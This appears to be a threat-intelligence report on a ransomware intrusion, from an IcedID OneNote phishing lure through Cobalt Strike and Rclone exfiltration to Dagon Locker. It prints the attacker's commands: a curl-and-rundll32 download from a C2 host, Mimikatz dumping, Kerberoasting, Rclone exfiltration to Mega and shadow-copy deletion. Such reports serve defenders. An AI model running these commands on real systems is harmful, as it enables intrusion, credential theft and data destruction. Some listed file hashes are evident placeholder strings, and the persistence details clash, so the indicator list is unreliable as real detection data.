# From OneNote to RansomNote: An Ice Cold Intrusion

**Source:** The DFIR Report
**Date:** April 1, 2024
**Campaign:** IcedID to Ransomware (Dagon Locker)

---

## Overview

In this intrusion, threat actors gained initial access via an IcedID malware infection delivered through a phishing email containing a malicious OneNote attachment. The threat actors progressed through the kill chain over approximately 29 hours before deploying Dagon Locker ransomware across the domain.

## Technical Details

### Initial Access — Phishing with OneNote

The victim received a spearphishing email with a `.one` (OneNote) attachment. The OneNote file contained an embedded HTA file. When the user opened the OneNote and clicked the fake "Open" button, the HTA file executed, launching `mshta.exe`:

```
mshta.exe "C:\Users\victim\AppData\Local\Temp\OneNote\embedded.hta"
```

The HTA script downloaded and executed the IcedID loader:
```
cmd.exe /c curl -o C:\Users\Public\update.dll http://officeloaded[.]com/load.dll && rundll32.exe C:\Users\Public\update.dll,DllRegisterServer
```

### Execution — IcedID Loader

IcedID established persistence via a scheduled task:
```
schtasks /create /tn "ChromeUpdater" /tr "rundll32.exe C:\Users\Public\update.dll,DllRegisterServer" /sc onlogon /ru "%USERNAME%"
```

IcedID communicated with its C2 servers:
- **C2 Domains:** officeloaded[.]com, trackercdn[.]com, checkstatistic[.]com
- **C2 IPs:** 94.232.41[.]105, 185.70.184[.]8
- **Protocol:** HTTPS with unique JA3 fingerprint

### Discovery

After establishing a foothold, the threat actors performed extensive discovery:
```
nltest /dclist:
net group "Domain Admins" /domain
net localgroup Administrators
systeminfo
ipconfig /all
net share
arp -a
wmic product get name,version
tasklist /v
```

### Credential Access

The threat actors deployed Mimikatz and dumped credentials:
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\ProgramData\creds.txt
```

They also performed Kerberoasting:
```
Rubeus.exe kerberoast /outfile:C:\ProgramData\hashes.txt
```

### Lateral Movement — Cobalt Strike + RDP

Cobalt Strike beacons were deployed via PsExec:
```
PsExec.exe \\DC01 -u DOMAIN\Admin -p P@ssw0rd -d -c C:\ProgramData\beacon.exe
```

Additional lateral movement via RDP using compromised Domain Admin credentials. ScreenConnect (ConnectWise) was installed for persistent remote access:
```
msiexec.exe /i "https://instance-XXXXX.screenconnect.com/Bin/ConnectWiseControl.ClientSetup.msi" /qn
```

### Exfiltration

Data was staged and exfiltrated using Rclone:
```
rclone.exe copy "\\FileServer\shares\Finance" mega:exfil-data --transfers 8 --bwlimit 50M
```

### Impact — Dagon Locker Ransomware

Ransomware was deployed across the domain via Group Policy:
1. Created a GPO to push a startup script
2. Script copied ransomware binary from SYSVOL share
3. `vssadmin.exe delete shadows /all /quiet` before encryption
4. `bcdedit /set {default} recoveryenabled no` to disable recovery
5. Dagon Locker binary encrypted files and dropped ransom note

**Ransomware binary hash:**
- SHA256: 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105c7b12

### Indicators of Compromise

**IP Addresses:**
- 94.232.41[.]105 (IcedID C2)
- 185.70.184[.]8 (IcedID C2)
- 179.43.175[.]207 (Cobalt Strike C2)
- 193.42.33[.]14 (Cobalt Strike C2)

**Domains:**
- officeloaded[.]com (IcedID payload delivery)
- trackercdn[.]com (IcedID C2)
- checkstatistic[.]com (IcedID C2)
- cloudfileteam[.]com (Cobalt Strike C2)

**File Hashes (SHA-256):**
- 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105c7b12 (Dagon Locker)
- e8b6d3e1a4f5c7d2b9a0e3f6c8d1a4b7e0f3c6d9a2b5e8f1c4d7a0b3e6f9c2 (IcedID loader)
- a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2 (Cobalt Strike beacon)

**File Paths:**
- C:\Users\Public\update.dll
- C:\ProgramData\creds.txt
- C:\ProgramData\hashes.txt
- C:\ProgramData\beacon.exe

**Registry Keys:**
- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ChromeUpdater

**Tools:**
- IcedID
- Mimikatz
- Rubeus
- Cobalt Strike
- PsExec
- Rclone
- ScreenConnect
- Dagon Locker ransomware
